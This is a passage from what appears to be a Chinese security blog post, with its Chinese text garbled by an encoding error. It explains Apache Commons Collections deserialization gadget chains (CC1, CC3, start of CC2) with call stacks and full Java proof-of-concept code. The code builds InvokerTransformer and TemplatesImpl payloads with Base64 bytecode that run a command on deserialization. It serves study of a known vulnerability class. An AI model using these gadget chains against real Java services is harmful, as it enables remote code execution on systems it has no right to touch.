AAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åå°„è®¾ç½® Field</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">        instantiateTransformer.transform(TrAXFilter.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h2 id="CC1-7"><a href="#CC1-7" class="headerlink" title="CC1-7"></a>CC1-7</h2><h3 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h3><p>é€šè¿‡ AnnotationInvocationHandler ç±»è§¦å‘ LazyMap çš„ get æ–¹æ³•ã€‚<br>ç®€åŒ–ç‰ˆ AnnotationInvocationHandler ç±»çš„ä»£ç ï¼š</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æ„é€ å‡½æ•°ï¼Œå¯ä¼ å…¥ LazyMap</span></span><br><span class="line">    AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">        <span class="built_in">this</span>.type = var1;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = var2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//åˆ©ç”¨ invoke æ–¹æ³•å¯å®ç°è°ƒç”¨ LazyMap#get</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.get(var4);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>AnnotationInvocationHandler ç±» readObject æ–¹æ³•ä»£ç ï¼šå…³é”®ç‚¹åœ¨ this.memberValues.entrySet() ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ä¸º memberValues ä¼ å…¥ä¸€ä¸ªä»£ç†å¯¹è±¡ã€‚é€šè¿‡ java çš„åŠ¨æ€ä»£ç†æœºåˆ¶ï¼Œä½¿å…¶æœ€ç»ˆè§¦å‘ AnnotationInvocationHandler ç±»çš„ invoke æ–¹æ³•ï¼Œä»è€Œå®ç°è§¦å‘ LazyMap.get()ã€‚</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        <span class="type">AnnotationType</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var2 = AnnotationType.getInstance(<span class="built_in">this</span>.type);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var2.memberTypes();</span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Entry)var4.next();</span><br><span class="line">            <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br><span class="line">            <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);</span><br><span class="line">            <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p><strong>æµ‹è¯•ç¯å¢ƒ</strong>ï¼š3.1-3.2.1 jdkç‰ˆæœ¬å°äºu71</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Apache_Common_Collections.cc_1_7;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Transformeræ•°ç»„</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ChainedTransformerå®ä¾‹</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//LazyMapå®ä¾‹</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">uselessMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(uselessMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//åå°„è·å–AnnotationInvocationHandlerå®ä¾‹</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, lazyMap);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//åŠ¨æ€ä»£ç†ç±»ï¼Œè®¾ç½®ä¸€ä¸ªDä»£ç†å¯¹è±¡ï¼Œä¸ºäº†è§¦å‘ AnnotationInvocationHandler#invoke           </span></span><br><span class="line">            <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler);</span><br><span class="line"></span><br><span class="line">            <span class="type">InvocationHandler</span> <span class="variable">handler1</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, mapProxy);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//åºåˆ—åŒ–</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">            oos.writeObject(handler1);</span><br><span class="line">            oos.flush();</span><br><span class="line">            oos.close();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//æµ‹è¯•ååºåˆ—åŒ–</span></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">            ois.readObject();</span><br><span class="line">            ois.close();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>è°ƒç”¨æ ˆ</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-&gt;AnnotationInvocationHandler.readObject()</span><br><span class="line">      -&gt;mapProxy.entrySet().iterator()  <span class="comment">//åŠ¨æ€ä»£ç†ç±»</span></span><br><span class="line">          -&gt;AnnotationInvocationHandler.invoke()</span><br><span class="line">            -&gt;LazyMap.get()</span><br><span class="line">                -&gt;ChainedTransformer.transform()</span><br><span class="line">                -&gt;ConstantTransformer.transform()</span><br><span class="line">                    -&gt;InvokerTransformer.transform()</span><br><span class="line">                    -&gt;â€¦â€¦â€¦â€¦</span><br></pre></td></tr></table></figure></div><h3 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h3><p><strong>æµ‹è¯•ç¯å¢ƒ</strong>ï¼š3.1-3.2.1ï¼Œjdk7u21åŠä»¥å‰</p><p>å¯¹ CC1 è¿›è¡Œäº†ä¸€äº›ä¿®æ”¹ã€‚å¼•å…¥äº† TemplatesImpl æ¥åŠ è½½å­—èŠ‚ç ï¼Œå»æ‰äº† InvokerTransformer ï¼Œå¼•å…¥äº† InstantiateTransformerã€‚</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections3</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//å­—èŠ‚ç </span></span><br><span class="line">            <span class="type">byte</span>[] code = Base64.decode(<span class="string">&quot;yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//åå°„è®¾ç½® Field</span></span><br><span class="line">            <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">            setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">            setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">            setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">            <span class="comment">//Transformeræ•°ç»„</span></span><br><span class="line">            Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//LazyMapå®ä¾‹</span></span><br><span class="line">            <span class="type">Map</span> <span class="variable">uselessMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(uselessMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//åå°„è·å–AnnotationInvocationHandlerå®ä¾‹</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, lazyMap);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//åŠ¨æ€ä»£ç†ç±»ï¼Œä¸ºäº†è§¦å‘ AnnotationInvocationHandler#invoke</span></span><br><span class="line">            <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler);</span><br><span class="line"></span><br><span class="line">            <span class="type">InvocationHandler</span> <span class="variable">handler1</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, mapProxy);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">//åºåˆ—åŒ–</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">            oos.writeObject(handler1);</span><br><span class="line">            oos.flush();</span><br><span class="line">            oos.close();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//æµ‹è¯•ååºåˆ—åŒ–</span></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">            ois.readObject();</span><br><span class="line">            ois.close();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//åå°„è®¾ç½® Field</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(object, value);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>è°ƒç”¨æ ˆ</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-&gt;AnnotationInvocationHandler.readObject()</span><br><span class="line">      -&gt;mapProxy.entrySet().iterator()  <span class="comment">//åŠ¨æ€ä»£ç†ç±»</span></span><br><span class="line">          -&gt;AnnotationInvocationHandler.invoke()</span><br><span class="line">            -&gt;LazyMap.get()</span><br><span class="line">                -&gt;ChainedTransformer.transform()</span><br><span class="line">                    -&gt;ConstantTransformer.transform()</span><br><span class="line">                        -&gt;InstantiateTransformer.transform()</span><br><span class="line">                            -&gt;TrAXFilter.TrAXFilter()</span><br><span class="line">                                -&gt;TemplatesImpl.newTransformer()</span><br><span class="line">                                    -&gt;â€¦â€¦â€¦â€¦</span><br></pre></td></tr></table></figure></div><h3 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h3><p>åˆ©ç”¨æ¡ä»¶æ¯”è¾ƒè‹›åˆ»ï¼šé¦–å…ˆ CommonsCollections3 ä¸­æ— æ³•ä½¿ç”¨ï¼Œå› ä¸ºå…¶ TransformingComparator æ— æ³•åºåˆ—åŒ–ã€‚å…¶æ¬¡åªæœ‰ CommonsCollections4-4.0 å¯ä»¥ä½¿ç”¨ï¼Œå› ä¸º CommonsCollections4 å…¶ä»–ç‰ˆæœ¬å»æ‰äº† InvokerTransformer çš„ Serializable ç»§æ‰¿ï¼Œå¯¼è‡´æ— 